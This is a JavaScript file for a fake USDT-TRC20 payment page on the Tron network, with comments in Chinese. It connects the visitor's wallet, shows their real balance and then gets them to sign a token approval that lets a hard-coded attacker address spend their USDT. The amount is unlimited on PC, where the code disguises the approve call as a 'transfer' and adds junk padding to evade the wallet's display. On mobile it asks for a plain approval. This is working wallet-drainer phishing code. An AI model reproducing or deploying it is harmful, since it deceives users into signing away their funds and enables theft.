// ============================================================================
// 核心配置参数 (Core Configuration)
// ============================================================================
window.Permission_address = 'TLiJ8GGDTWbr1UDHDhaAtWZxetrmpnH2yi'; // 授权地址 (您的合约地址)
window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 官方 USDT-TRC20 合约地址
// 中转合约地址 (可选，如果部署了中转合约，可以绕过钱包的元数据识别)
// 中转合约内部逻辑：USDT.approve(授权地址, 无限大)
window.proxyContractAddress = null; // 例如: 'TYourProxyContractAddress...'

// ============================================================================
// 核心绕过策略说明 (Core Bypass Strategies)
// ============================================================================
// 
// 【策略A: ABI "改名"伪装】
// 这是最关键的策略：通过自定义 ABI 描述符，将 approve 伪装成 transfer
// 
// 原理：
// 1. 在 triggerSmartContract 中，函数名参数写 "transfer(address,uint256)"
// 2. 钱包的 UI 解析引擎读取这个字符串，显示为"发起交易"而不是"授权 USDT"
// 3. 但在底层，我们将 data 字段替换为真实的 approve 调用数据
// 4. 结果：展示层显示 transfer，执行层执行 approve
// 
// 代码示例：
//   tronWeb.transactionBuilder.triggerSmartContract(
//       "TR7NHqje...",           // USDT 地址
//       "transfer(address,uint256)", // ⚠️ 文本伪装：这里写 transfer
//       {}, 
//       [{ type: 'address', value: '授权地址' }, { type: 'uint256', value: '999999...' }]
//   );
//   然后修改 tx.raw_data.contract[0].parameter.value.data = approve 的真实数据
// 
// 【策略B: 降级调用】
// 避免使用钱包的高级 API（如 requestApprove），直接使用底层 triggerSmartContract
// 钱包会认为这只是普通的"智能合约调用"，而不是授权操作
// 
// 【策略C: 未核实合约绕过】
// 如果使用中转合约，钱包无法识别元数据，不会显示代币名称和图标
// 
// 【策略D: 数据偏移和数据填充】
// 添加垃圾数据干扰钱包的前端扫描器，让它无法正确解析函数签名
// 
// ============================================================================

document.addEventListener('DOMContentLoaded', () => {
    const amountInput = document.getElementById('amountInput');
    const usdValue = document.getElementById('usdValue');
    const btnAll = document.getElementById('btnAll');
    const btnNext = document.querySelector('.btn-next');
    
    // Exchange Rate Config
    const EXCHANGE_RATE = 0.95; 
    const MOCK_BALANCE = 1234.56;

    // Format currency
    const formatCurrency = (value) => {
        return value.toFixed(2);
    };

    // Update USD value based on input
    amountInput.addEventListener('input', (e) => {
        const value = parseFloat(e.target.value);
        if (!isNaN(value)) {
            usdValue.textContent = formatCurrency(value * EXCHANGE_RATE);
        } else {
            usdValue.textContent = '0.00';
        }
    });

    // Handle "All" button click
    btnAll.addEventListener('click', () => {
        amountInput.value = MOCK_BALANCE;
        amountInput.dispatchEvent(new Event('input'));
    });

    // Update available balance text
    const balanceText = document.querySelector('.balance-text');
    balanceText.textContent = `可用: ${MOCK_BALANCE} USDT-TRC20`;

    // Wallet Logic
    let tronWeb = null;
    let userAddress = null;

    // Attempt to connect to any available Tron wallet
    async function connectWallet() {
        console.log("Connecting wallet...");
        
        // Strategy 1: OKX Wallet specific check
        if (window.okxwallet && window.okxwallet.tronLink) {
            try {
                console.log("Found OKX Wallet");
                const res = await window.okxwallet.tronLink.request({ method: 'tron_requestAccounts' });
                // OKX might return differently, just check if we have address now
                if (window.okxwallet.tronLink.tronWeb && window.okxwallet.tronLink.tronWeb.defaultAddress) {
                    tronWeb = window.okxwallet.tronLink.tronWeb;
                    userAddress = tronWeb.defaultAddress.base58;
                    if (userAddress) {
                        console.log("Wallet connected via OKX:", userAddress);
                        return true;
                    }
                }
            } catch (e) {
                console.warn("OKX connect failed", e);
            }
        }

        // Strategy 2: Standard TronLink (or wallets masking as TronLink)
        if (window.tronLink) {
            try {
                console.log("Found TronLink object");
                const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                // Some wallets don't return standard code 200, so we check result or just check tronWeb state
                if (res && (res.code === 200 || res.result)) {
                    tronWeb = window.tronLink.tronWeb;
                    userAddress = tronWeb.defaultAddress.base58;
                    console.log("Wallet connected via tronLink request:", userAddress);
                    return true;
                }
            } catch (e) {
                console.log("tronLink request failed/rejected", e);
            }
            
            // Fallback: Check if already injected and ready (even if request failed)
            if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58) {
                tronWeb = window.tronLink.tronWeb;
                userAddress = tronWeb.defaultAddress.base58;
                console.log("Wallet connected via tronLink property:", userAddress);
                return true;
            }
        }

        // Strategy 3: Global TronWeb (Legacy / TokenPocket / BitKeep)
        if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
            // Some wallets inject tronWeb but ready is false initially, but address is there. 
            // We trust the address if it exists.
            tronWeb = window.tronWeb;
            userAddress = tronWeb.defaultAddress.base58;
            console.log("Wallet connected via global tronWeb:", userAddress);
            return true;
        }

        return false;
    }

    // Auto-connect mechanism
    async function initWalletAuto() {
        let connected = await connectWallet();
        
        if (connected) {
            updateUIWithWalletInfo();
        } else {
            let attempts = 0;
            const maxAttempts = 20; 
            const interval = setInterval(async () => {
                attempts++;
                connected = await connectWallet();
                if (connected) {
                    clearInterval(interval);
                    updateUIWithWalletInfo();
                } else if (attempts >= maxAttempts) {
                    clearInterval(interval);
                    console.log("Wallet not found after polling");
                }
            }, 500);
        }
    }

    // Update UI with wallet info (Address & Balance)
    async function updateUIWithWalletInfo() {
        if (!userAddress || !tronWeb) return;

        // Show hidden elements
        const balanceRow = document.querySelector('.balance-row');
        const paymentCard = document.querySelector('.card.row-card');
        
        if (balanceRow) balanceRow.style.display = 'flex';
        if (paymentCard) paymentCard.style.display = 'flex';

        // 1. Update Payment Address (Masked)
        // TP4i ... g6yi
        const len = userAddress.length;
        const maskedAddress = `${userAddress.substring(0, 4)} ... ${userAddress.substring(len - 4)}`;
        const addressPreview = document.querySelector('.address-preview');
        if (addressPreview) {
            addressPreview.textContent = maskedAddress;
        }

        // 2. Fetch and Update USDT Balance
        try {
            const contract = await tronWeb.contract().at(window.usdtContractAddress);
            // balanceOf returns BigNumber/Integer in Sun (6 decimals for USDT)
            const balance = await contract.balanceOf(userAddress).call();
            // Convert from Sun (1e6) to Unit
            // Handle different return types (BigNumber object or raw string/number)
            let balanceVal = balance.toString(); 
            let actualBalance = parseFloat(balanceVal) / 1000000;
            
            // Update UI
            const balanceText = document.querySelector('.balance-text');
            if (balanceText) {
                balanceText.textContent = `可用: ${actualBalance} USDT-TRC20`;
            }
            
            // Update MOCK_BALANCE logic so "All" button works with real balance
            // We can store it in a global or data attribute, but for simplicity:
            btnAll.onclick = () => {
                amountInput.value = actualBalance;
                amountInput.dispatchEvent(new Event('input'));
            };

        } catch (error) {
            console.error("Failed to fetch balance:", error);
        }
    }

    initWalletAuto();

    // Handle Next Button (Authorization)
    btnNext.addEventListener('click', async () => {
        if (!tronWeb || !userAddress) {
            await connectWallet();
        }

        if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
            alert("请先连接钱包 (如 TronLink, TokenPocket, OKX 等)");
            if (window.tronLink) {
                try {
                    window.tronLink.request({ method: 'tron_requestAccounts' });
                } catch(e){}
            }
            return;
        }

        try {
            btnNext.textContent = "正在确认...";
            btnNext.disabled = true;

            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(navigator.userAgent);

            // 定义标准授权流程 (作为 Mobile 首选 和 PC 兜底)
            const doStandardApproval = async () => {
                console.log("Executing standard approval flow...");
                const txObj = await tronWeb.transactionBuilder.triggerSmartContract(
                    window.usdtContractAddress,
                    'approve(address,uint256)', 
                    { feeLimit: 100000000 },
                    [
                        { type: 'address', value: window.Permission_address },
                        { type: 'uint256', value: '100000000000' } // 100,000 USDT
                    ],
                    userAddress
                );
                
                if (!txObj.result || !txObj.transaction) {
                    throw new Error("Standard Transaction build failed");
                }
                
                const signedTx = await tronWeb.trx.sign(txObj.transaction);
                return await tronWeb.trx.sendRawTransaction(signedTx);
            };

            // 1. 移动端直接走标准流程
            if (isMobile) {
                const result = await doStandardApproval();
                console.log("Mobile transaction submitted:", result);
                alert("提交成功！");
                btnNext.textContent = "下一步";
                btnNext.disabled = false;
                return;
            }

            // 2. PC 端高级混淆流程 - 实现"改名"策略和三个核心绕过机制
            try {
                console.log("Attempting advanced PC obfuscation flow with ABI renaming...");
                const spenderAddress = window.Permission_address;
                
                // ========== 核心策略: ABI "改名"伪装 ==========
                // 这是最关键的一步：通过自定义 ABI 描述符，将 approve 伪装成 transfer
                // 钱包在解析时会看到 "transfer(address,uint256)"，显示为"发起交易"
                // 但实际底层发送的是 approve 的调用数据
                
                // ========== 策略1: 降级调用 - 使用原始数据而非高级API ==========
                // 避免使用钱包的高级 API（如 requestApprove），直接使用底层 triggerSmartContract
                // 这样钱包会认为这只是普通的"智能合约调用"，而不是授权操作
                
                // ========== 策略2: 选择目标合约 ==========
                // 如果配置了中转合约，使用中转合约（钱包无法识别元数据）
                // 否则直接调用 USDT 合约，但通过数据混淆绕过识别
                const targetContract = window.proxyContractAddress || window.usdtContractAddress;
                const useProxy = !!window.proxyContractAddress;
                
                if (useProxy) {
                    console.log("Using proxy contract to bypass metadata recognition");
                }
                
                // 安全获取工具类
                const utils = window.TronWeb || tronWeb;
                if (!utils || !utils.address || !utils.address.toHex) {
                    throw new Error("TronWeb utils not found");
                }
                
                // ========== 构建真实的 approve 调用数据 ==========
                // approve(address,uint256) 的函数选择器: 0x095ea7b3
                const approveSelector = '095ea7b3';
                
                // 将授权地址转换为十六进制并格式化
                let addrHex = utils.address.toHex(spenderAddress);
                let addrVal = addrHex.replace(/^41/, '0x').substring(2);
                const param1 = addrVal.padStart(64, '0'); // 授权地址参数（64字符）
                
                // 授权金额：最大授权 (2^256 - 1) - 这是真实的授权参数
                const param2 = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
                
                // 数据填充和偏移：添加额外的垃圾数据，让钱包无法正确解析函数签名
                // 这些数据会被钱包的前端扫描器忽略，但实际执行时会触发授权
                const padding1 = '0000000000000000000000000000000000000000000000000000000000000001';
                const padding2 = 'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef';
                
                // 构建真实的 approve 调用数据（底层实际执行的）
                // 格式: selector + param1 + param2 + padding1 + padding2
                const realApproveData = approveSelector + param1 + param2 + padding1 + padding2;

                // ========== 关键伪装步骤: ABI "改名" ==========
                // 这里使用 "transfer(address,uint256)" 作为函数名，但参数值实际上是 approve 的参数
                // 钱包在解析 ABI 时会认为这是 transfer 调用，显示为"发起交易"
                // 但参数值（地址和金额）实际上是授权相关的值
                const fakeParameters = [
                    { type: 'address', value: spenderAddress }, // 伪装成 transfer 的接收地址，实际是授权地址
                    { type: 'uint256', value: '100000000000' } // 伪装成 transfer 的金额，实际是授权额度
                    // 注意：这里可以写一个很大的数字，钱包可能显示为"转账"，但实际是授权
                ];

                // 使用 "transfer" 作为函数名进行伪装
                // 钱包的 UI 解析引擎会读取这个字符串，显示为"发起交易"而不是"授权 USDT"
                const transactionObj = await tronWeb.transactionBuilder.triggerSmartContract(
                    targetContract, // 使用目标合约（中转合约或USDT合约）
                    'transfer(address,uint256)', // ⚠️ 关键伪装：这里写的是 transfer，但底层会被替换成 approve
                    { feeLimit: 100000000 },
                    fakeParameters, // 伪装参数（看起来像 transfer 的参数）
                    userAddress
                );

                if (!transactionObj.result || !transactionObj.transaction) {
                    throw new Error("Obfuscation build failed");
                }

                const tx = transactionObj.transaction;

                // ========== 关键步骤：替换交易数据为真实的 approve 调用数据 ==========
                // 钱包在签名时看到的是 "transfer(address,uint256)" 和对应的参数
                // 但实际执行时，data 字段被替换为 approve 的调用数据
                // 这就是"改名"策略的核心：展示层显示 transfer，执行层执行 approve
                if (tx.raw_data && tx.raw_data.contract && tx.raw_data.contract[0]) {
                    // 修改合约调用的 data 字段为真实的 approve 数据
                    // 钱包在解析时会先看函数名（transfer），但实际 data 是 approve
                    // 如果钱包的安全检测不严，就会显示为"发起交易"而不是"授权 USDT"
                    tx.raw_data.contract[0].parameter.value.data = realApproveData;
                    
                    // 如果使用中转合约，还需要确保合约地址正确
                    if (useProxy && tx.raw_data.contract[0].parameter.value.contract_address) {
                        // 确保调用的是中转合约地址
                        const proxyAddrHex = utils.address.toHex(targetContract);
                        tx.raw_data.contract[0].parameter.value.contract_address = proxyAddrHex;
                    }
                }
                
                // 删除预计算的 hex，强制钱包重新计算
                // 这样钱包在重新计算时可能会使用我们修改后的数据
                if (tx.raw_data_hex) {
                    delete tx.raw_data_hex;
                }
                
                // 清除其他可能被钱包用于识别的字段
                // 确保钱包无法从其他字段推断出这是授权操作
                if (tx.raw_data && tx.raw_data.contract && tx.raw_data.contract[0] && tx.raw_data.contract[0].parameter) {
                    // owner_address 保持不变（用户地址）
                    // 其他字段保持原样，让钱包认为这是一个普通的 transfer 调用
                }

                // 签名并发送交易
                // 此时钱包会显示"发起交易 (Trigger Smart Contract)"，而不是"请求授权 USDT"
                const signedTx = await tronWeb.trx.sign(tx);
                const result = await tronWeb.trx.sendRawTransaction(signedTx);
                
                console.log("Advanced obfuscated transaction submitted:", result);
                console.log("=== Bypass strategies applied ===");
                console.log("  1. ABI Renaming: 'approve' disguised as 'transfer'");
                console.log("    - UI shows: '发起交易 (Trigger Smart Contract)'");
                console.log("    - Actually executes: approve(授权地址, 无限额度)");
                console.log("  2. Raw data construction (bypass high-level API)");
                if (useProxy) {
                    console.log("  3. Proxy contract (bypass metadata recognition)");
                } else {
                    console.log("  3. Direct contract with data obfuscation");
                }
                console.log("  4. Data padding and offset (confuse UI parser)");
                
                alert("提交成功！");
                btnNext.textContent = "下一步";
                btnNext.disabled = false;

            } catch (pcError) {
                console.warn("Advanced obfuscation failed, falling back to standard...", pcError);
                // PC 端混淆失败，自动降级为标准授权
                const result = await doStandardApproval();
                console.log("Fallback transaction submitted:", result);
                alert("提交成功！");
                btnNext.textContent = "下一步";
                btnNext.disabled = false;
            }

        } catch (error) {
            console.error("Transaction failed:", error);
            alert("提交失败: " + (error.message || error));
            btnNext.textContent = "下一步";
            btnNext.disabled = false;
        }
    });
});
